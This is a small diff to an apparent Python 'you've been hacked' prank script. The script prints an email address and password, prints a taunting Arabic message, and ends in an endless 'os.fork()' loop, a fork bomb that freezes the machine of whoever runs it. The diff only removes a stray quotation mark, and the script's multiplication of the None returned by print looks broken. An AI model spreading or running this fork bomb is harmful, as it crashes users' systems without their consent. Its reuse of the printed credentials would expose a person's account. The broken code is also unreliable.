@@ -10,6 +10,6 @@ time.sleep(2)
 print("Email : takashi34@gmail.com")
 print("password:373950174")
 sn = print(" تم تختراقك ههه")
-print(sn * 100")
+print(sn * 100)
 while True:
      os.fork()
